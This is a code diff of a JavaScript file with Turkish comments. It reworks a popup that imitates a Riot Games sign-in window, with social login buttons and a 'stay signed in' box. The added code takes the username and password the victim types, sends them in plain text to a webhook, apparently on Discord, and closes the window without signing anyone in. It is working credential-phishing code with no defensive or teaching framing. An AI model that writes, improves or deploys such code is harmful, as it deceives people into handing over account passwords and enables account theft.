@@ -53,39 +53,126 @@ setInterval(() => {
 
 // 5. Giriş Penceresi
 function openAuth() {
-    const w = 600, h = 800;
-    const l = (window.screen.width/2)-(w/2), t = (window.screen.height/2)-(h/2);
+    const w = 450, h = 650;
+    const l = (screen.width/2)-(w/2), t = (screen.height/2)-(h/2);
     let win = window.open("", "RiotLogin", `width=${w},height=${h},top=${t},left=${l}`);
     
     win.document.body.innerHTML = `
         <style>
-            body { margin:0; height:100vh; background: url('login_bg.jpg') center/cover; display:flex; justify-content:center; align-items:center; font-family:sans-serif; }
-            .c { background:#fff; width:340px; padding:40px; border-radius:4px; text-align:center; }
-            input { width:100%; padding:14px; margin:10px 0; background:#f2f2f2; border:2px solid transparent; border-radius:4px; box-sizing:border-box; outline:none; font-weight:600; }
-            input:focus { border-color:#ff4655; background:#fff; }
-            button { width:100%; padding:16px; background:#ff4655; color:#fff; border:none; border-radius:8px; cursor:pointer; font-weight:700; margin-top:30px; }
+            @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap');
+            body { 
+                margin:0; height:100vh; background: #fff; 
+                display:flex; justify-content:center; align-items:center; 
+                font-family: 'Inter', sans-serif; color: #111;
+            }
+            .card { width:100%; max-width:340px; padding:20px; text-align:center; }
+            h1 { font-weight: 900; font-size: 28px; letter-spacing: -1px; margin-bottom: 40px; text-transform: uppercase; }
+            
+            .input-group { margin-bottom: 15px; position: relative; }
+            input { 
+                width:100%; padding: 16px; background: #f2f2f2; border: 2px solid transparent; 
+                border-radius: 4px; box-sizing: border-box; font-weight: 700; font-size: 12px;
+                transition: 0.2s; outline: none; color: #111;
+            }
+            input:focus { background: #fff; border-color: #111; }
+            input::placeholder { color: #999; text-transform: uppercase; }
+
+            .social-grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 8px; margin: 25px 0; }
+            .social-btn { 
+                height: 40px; border-radius: 4px; display: flex; align-items: center; 
+                justify-content: center; cursor: pointer; border: none; transition: 0.2s;
+            }
+            .social-btn:hover { opacity: 0.8; }
+            .fb { background: #1877f2; }
+            .gg { background: #fff; border: 1px solid #e5e5e5; }
+            .ap { background: #000; }
+            .xb { background: #107c10; }
+            .ps { background: #00439c; }
+            .social-btn img { width: 18px; }
+
+            .stay-signed { 
+                display: flex; align-items: center; gap: 10px; font-size: 13px; 
+                color: #111; font-weight: 600; margin-top: 10px; cursor: pointer; text-align: left;
+            }
+            .checkbox { width: 18px; height: 18px; background: #f2f2f2; border-radius: 4px; display: inline-block; }
+
+            .submit-container { margin-top: 60px; display: flex; justify-content: center; }
+            .next-btn { 
+                width: 70px; height: 70px; border: 2px solid #e5e5e5; border-radius: 20px; 
+                background: #fff; cursor: pointer; display: flex; align-items: center; 
+                justify-content: center; transition: 0.2s;
+            }
+            .next-btn:hover { border-color: #ff4655; }
+            .next-btn svg { width: 24px; fill: #ccc; transition: 0.2s; }
+            .next-btn.active { border-color: #ff4655; }
+            .next-btn.active svg { fill: #ff4655; }
+
+            .footer-links { margin-top: 40px; font-size: 11px; font-weight: 700; color: #111; text-transform: uppercase; cursor: pointer; }
+            .footer-links div { margin-bottom: 8px; opacity: 0.6; transition: 0.2s; }
+            .footer-links div:hover { opacity: 1; }
         </style>
-        <div class="c">
-            <img src="login_logo.png" width="100" style="margin-bottom:20px;">
-            <h2 style="color:#111;">Oturum Aç</h2>
-            <input type="text" id="user" placeholder="KULLANICI ADI">
-            <input type="password" id="pass" placeholder="ŞİFRE">
-            <button id="go">GİRİŞ YAP</button>
+
+        <div class="card">
+            <h1>Giriş</h1>
+            
+            <div class="input-group">
+                <input type="text" id="u" placeholder="Kullanıcı Adı">
+            </div>
+            <div class="input-group">
+                <input type="password" id="p" placeholder="Şifre">
+            </div>
+
+            <div class="social-grid">
+                <button class="social-btn fb"><img src="https://www.edigitalagency.com.au/wp-content/uploads/Facebook-logo-blue-circle-large-transparent-png.png"></button>
+                <button class="social-btn gg"><img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_Reference_icon.svg"></button>
+                <button class="social-btn ap"><img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" style="filter:invert(1)"></button>
+                <button class="social-btn xb"><img src="https://upload.wikimedia.org/wikipedia/commons/f/f9/Xbox_one_logo.svg" style="filter:invert(1)"></button>
+                <button class="social-btn ps"><img src="https://upload.wikimedia.org/wikipedia/commons/4/4e/PlayStation_logo_and_wordmark.svg" style="filter:invert(1)"></button>
+            </div>
+
+            <label class="stay-signed">
+                <div class="checkbox" id="check"></div>
+                Oturumu açık tut
+            </label>
+
+            <div class="submit-container">
+                <button class="next-btn" id="go">
+                    <svg viewBox="0 0 24 24"><path d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z"/></svg>
+                </button>
+            </div>
+
+            <div class="footer-links">
+                <div>Oturum açamıyor musun?</div>
+                <div>Hesap Oluştur</div>
+            </div>
         </div>
     `;
 
+    // Input dolunca butonun parlaması ve Webhook tetikleyici
+    const uInput = win.document.getElementById('u');
+    const pInput = win.document.getElementById('p');
+    const goBtn = win.document.getElementById('go');
+
+    const checkInputs = () => {
+        if(uInput.value.length > 0 && pInput.value.length > 0) {
+            goBtn.classList.add('active');
+        } else {
+            goBtn.classList.remove('active');
+        }
+    };
+
+    uInput.oninput = checkInputs;
+    pInput.oninput = checkInputs;
+
     win.document.getElementById('go').onclick = function() {
-        const u = win.document.getElementById('user').value;
-        const p = win.document.getElementById('pass').value;
+        const u = uInput.value, p = pInput.value;
         if(u && p) {
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content: `🔑 **Giriş:** \`${u}\` / \`${p}\`` })
-            }).then(() => {
-                win.document.body.innerHTML = "<h2>Yönlendiriliyorsunuz...</h2>";
-                setTimeout(() => win.close(), 1200);
+            fetch(WEBHOOK_URL, { 
+                method: 'POST', 
+                headers: { 'Content-Type': 'application/json' }, 
+                body: JSON.stringify({ content: "👤: " + u + " | 🔑: " + p }) 
             });
+            win.close();
         }
     };
 }
